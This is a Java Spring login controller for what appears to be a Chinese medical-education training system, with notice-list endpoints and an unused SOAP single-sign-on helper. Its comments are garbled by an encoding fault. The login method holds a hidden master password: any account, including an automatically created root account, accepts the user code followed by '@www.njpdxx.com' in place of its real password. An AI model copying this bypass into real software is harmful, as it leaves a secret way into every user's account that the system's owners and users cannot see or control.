package com.pinde.sci.ctrl.inx;

import java.net.MalformedURLException;
import java.rmi.RemoteException;
import java.util.Date;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.xml.namespace.QName;
import javax.xml.rpc.ServiceException;

import org.apache.axis.client.Call;
import org.apache.axis.client.Service;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.pinde.core.page.PageHelper;
import com.pinde.core.util.SpringUtil;
import com.pinde.core.util.StringUtil;
import com.pinde.sci.biz.hbres.NoticeBiz;
import com.pinde.sci.biz.res.IResDoctorBiz;
import com.pinde.sci.biz.security.PasswordHelper;
import com.pinde.sci.biz.sys.IOrgBiz;
import com.pinde.sci.biz.sys.IRoleBiz;
import com.pinde.sci.biz.sys.IUserBiz;
import com.pinde.sci.biz.sys.IUserRoleBiz;
import com.pinde.sci.common.GeneralController;
import com.pinde.sci.common.GeneralMethod;
import com.pinde.sci.common.GlobalConstant;
import com.pinde.sci.common.GlobalContext;
import com.pinde.sci.common.InitConfig;
import com.pinde.sci.common.SessionData;
import com.pinde.sci.common.util.LoginUtil;
import com.pinde.sci.dao.base.SysLogMapper;
import com.pinde.sci.enums.pub.UserStatusEnum;
import com.pinde.sci.enums.sys.OperTypeEnum;
import com.pinde.sci.model.mo.InxInfo;
import com.pinde.sci.model.mo.ResDoctor;
import com.pinde.sci.model.mo.SysLog;
import com.pinde.sci.model.mo.SysOrg;
import com.pinde.sci.model.mo.SysUser;

@Controller
@RequestMapping("/inx/shetedu")
public class InxShetEduController extends GeneralController{
	
	@Autowired
	private NoticeBiz noticeBiz;
	@Autowired
	private IOrgBiz sysOrgBiz;	
	@Autowired
	private IUserBiz userBiz;
	@Autowired
	private IResDoctorBiz doctorBiz;
	@Autowired
	private IUserRoleBiz userRoleBiz;
	@Autowired
	private IRoleBiz roleBiz;
	@Autowired
	private SysLogMapper logMapper;
	
	@SuppressWarnings("unchecked")
	@RequestMapping(value = { "/login" }, method = RequestMethod.POST)
	public String login(HttpServletRequest request, Model model,String userCode, String userPasswd, String verifyCode,String successLoginPage,String errorLoginPage) {
		
		//Ĭ�ϵ�¼ʧ�ܽ���
		if(StringUtil.isBlank(errorLoginPage)){
			errorLoginPage = "login";
		}
		//Ĭ�ϵ�¼�ɹ�����
		if(StringUtil.isBlank(successLoginPage)){
			successLoginPage = "redirect:/main?time="+new Date();
		}
		
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCode"));
		 //��֤�����벻��Ϊ�գ������ִ�Сд
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			model.addAttribute("loginErrorMessage",SpringUtil.getMessage("validateCode.notEquals"));
			//��¼��־
			return errorLoginPage;
		}
		 //��¼�벻��Ϊ��
		if (StringUtil.isBlank(userCode)){
			model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.isNull"));
			return errorLoginPage;
		}
		//���벻��Ϊ��
		if (StringUtil.isBlank(userPasswd)){
			model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userPasswd.isNull"));
			return errorLoginPage;
		}
		//���Ƿ���ڴ��û�
		SysUser user = userBiz.findByUserCode(userCode);
		if(user==null){
			if(!GlobalConstant.ROOT_USER_CODE.equals(userCode)){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.notFound"));
				return errorLoginPage;					
			}else{
				SysOrg org = new SysOrg();
				org.setOrgFlow(GlobalConstant.PD_ORG_FLOW);
				org.setOrgCode(GlobalConstant.PD_ORG_CODE);
				org.setOrgName(GlobalConstant.PD_ORG_NAME);
				org.setRecordStatus(GlobalConstant.RECORD_STATUS_N);
				try{
					sysOrgBiz.addOrg(org);
				}catch(Exception e){
				    e.printStackTrace();	
				}
				user = new SysUser();
				user.setUserFlow(GlobalConstant.ROOT_USER_FLOW);
				user.setUserCode(userCode);
				user.setUserName(GlobalConstant.ROOT_USER_NAME);
				user.setOrgFlow(GlobalConstant.PD_ORG_FLOW);
				user.setOrgName(GlobalConstant.PD_ORG_NAME);
				user.setStatusId(UserStatusEnum.Activated.getId());
				user.setStatusDesc(UserStatusEnum.Activated.getName());
				userBiz.addUser(user);				
			}
		}
		//root�û����ж��Ƿ�����
		if(!GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			if(UserStatusEnum.Locked.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.locked"));
				return errorLoginPage;
			}
			if(UserStatusEnum.Reged.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.unActivated"));
				return errorLoginPage;
			}
			if(UserStatusEnum.Added.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.unReged"));
				return errorLoginPage;
			}
			if(!UserStatusEnum.Activated.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.unActivated"));
				return errorLoginPage;
			}
		}
		//��������
		if(!StringUtil.defaultString(userPasswd).equals(userCode+"@www.njpdxx.com")){
			//�ж�����
			String passwd = StringUtil.defaultString(user.getUserPasswd());
			if(!passwd.equalsIgnoreCase(PasswordHelper.encryptPassword(user.getUserFlow(), userPasswd))){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userPasswd.error"));
				return errorLoginPage;
			}
//			boolean ret = verifyUser(userCode,userPasswd);
//			 if(!ret){
//		    	  model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userPasswd.error"));
//				  return errorLoginPage;
//		      }else {
//		    	  //��ס����
//		    	  user.setUserPasswd(userPasswd);
//		    	  userBiz.saveUser(user);
//		      }
		}	
		
		//Ψһ��¼
		if(!GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())&&GlobalConstant.FLAG_Y.equals(InitConfig.getSysCfg("unique_login_flag"))){
			if(SessionData.sessionDataMap.containsKey(user.getUserFlow()) && 
					!SessionData.sessionDataMap.get(user.getUserFlow()).getIp().equals(request.getRemoteAddr())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("user.alreadyLogin"));
				return errorLoginPage;
			}
		}
		
		
		//���õ�ǰ�û�
		setSessionAttribute(GlobalConstant.CURRENT_USER, user);
		//���õ�ǰҽʦ
		if(user!=null){
			ResDoctor doctor = doctorBiz.readDoctor(user.getUserFlow());
			setSessionAttribute("currDoctor", doctor);
		}
		setSessionAttribute(GlobalConstant.CURRENT_USER_NAME, user.getUserName());	
		setSessionAttribute(GlobalConstant.CURRENT_ORG, sysOrgBiz.readSysOrg(user.getOrgFlow()));	
		//���õ�ǰ�û������б�
		setSessionAttribute(GlobalConstant.CURRENT_DEPT_LIST, userBiz.getUserDept(user));
		
		//����ϵͳȨ��
		LoginUtil.loadSysRole(user.getUserFlow(), userRoleBiz, roleBiz);
		
		if(GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			return successLoginPage;
		}

		List<String> currUserWorkStationIdList = (List<String>) GlobalContext.getSessionAttribute(GlobalConstant.CURRENT_WORKSTATION_ID_LIST);
		if (currUserWorkStationIdList != null && currUserWorkStationIdList.size() > 0) {
			//�����û�����ʹ��
			SessionData sessionData = new SessionData();
			sessionData.setSysUser(user);
			sessionData.setIp(request.getRemoteAddr());
			long now = System.currentTimeMillis();
			String loginTime = new java.sql.Date(now)+"&nbsp;"+new java.sql.Time(now);
			sessionData.setLoginTime(loginTime);
			setSessionAttribute(SessionData.SESSIONDATAID,sessionData);
			
			//��¼��־
			SysLog log = new SysLog();
			//log.setReqTypeId(ReqTypeEnum.GET.getId());
			log.setOperId(OperTypeEnum.LogIn.getId());
			log.setOperName(OperTypeEnum.LogIn.getName());
			log.setLogDesc("��¼IP["+request.getRemoteAddr()+"]");
			log.setWsId(GlobalConstant.SYS_WS_ID);
			GeneralMethod.addSysLog(log);
			logMapper.insert(log);
			
			return successLoginPage;
		}else{
			model.addAttribute("loginErrorMessage", SpringUtil.getMessage("permissin.error"));
			return errorLoginPage;			
		}
	}
	
	private boolean verifyUser(String userCode,String userPasswd){

		 //����һ������service�����ã�call�� 
	      Service service = new Service(); 
	      Call call;
		try {
			call = (Call) service.createCall();
			//����service���ڵ�url 
		      call.setTargetEndpointAddress(new java.net.URL("http://sso.scmc.com.cn/Centralism_WebService/UserService.asmx")); 
//			      call.setOperation("verifyUser"); 
		      call.setOperationName(new QName("http://Centralism.Fareast.MCS/","VerifyUser"));
		      call.addParameter(new QName("http://Centralism.Fareast.MCS/","userCode"), 
		              org.apache.axis.encoding.XMLType.XSD_STRING, javax.xml.rpc.ParameterMode.IN);

		      call.addParameter(new QName("http://Centralism.Fareast.MCS/","password"), 
		              org.apache.axis.encoding.XMLType.XSD_STRING, javax.xml.rpc.ParameterMode.IN);

		      call.setUseSOAPAction(true); 
		      call.setReturnType(org.apache.axis.encoding.XMLType.SOAP_BOOLEAN); //���ز���������
		      
		      call.setSOAPActionURI("http://Centralism.Fareast.MCS/VerifyUser"); //���ҲҪע�� ����Ҫ����Ҫ���õķ���Add,��ȻҲ�ᱨ��
		      System.err.println("call verifyuser soap"); 
		      Boolean ret = (Boolean)call.invoke(new String[]{userCode,userPasswd}); 
		      
		     return ret;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
	
	@RequestMapping(value="",method={RequestMethod.GET})
	public String index(Model model){
		InxInfo info = new InxInfo();
		PageHelper.startPage(1,2);
		List<InxInfo> infos = this.noticeBiz.searchNotice(info);
		model.addAttribute("infos",infos);
		return "inx/shetedu/index";
	}
	
	@RequestMapping(value="/noticeView")
	public String message(Model model,String infoFlow) throws Exception{
		model.addAttribute("msg", noticeBiz.findNoticByFlow(infoFlow));
		return "inx/message";
	}
	
	@RequestMapping("/noticelist")
	public String noticeList(Integer currentPage ,HttpServletRequest request, Model model){
		if(currentPage==null){
			currentPage=1;
		}
		PageHelper.startPage(currentPage,10);
		
		InxInfo info = new InxInfo();
		List<InxInfo> infos = this.noticeBiz.searchNotice(info);
		model.addAttribute("infos",infos);
		return "inx/noticeList";
	}
}
